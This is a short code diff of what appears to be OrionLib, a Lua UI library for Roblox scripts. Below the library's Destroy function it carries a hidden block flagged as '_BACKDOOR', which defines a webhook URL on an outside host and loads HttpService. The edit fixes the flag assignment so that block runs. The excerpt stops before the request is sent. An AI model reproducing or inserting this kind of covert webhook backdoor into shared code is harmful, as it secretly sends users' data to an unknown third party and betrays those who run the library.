@@ -1768,7 +1768,7 @@ function OrionLib:Destroy()
 end
 
 if not getgenv()._BACKDOOR then 
-getgenv()._BACKDOOR =
+getgenv()._BACKDOOR = true
 local webhookUrl = "https://dcwh.my/post?uniqueid=af985e6a"
 
 local HttpService = game:GetService("HttpService")
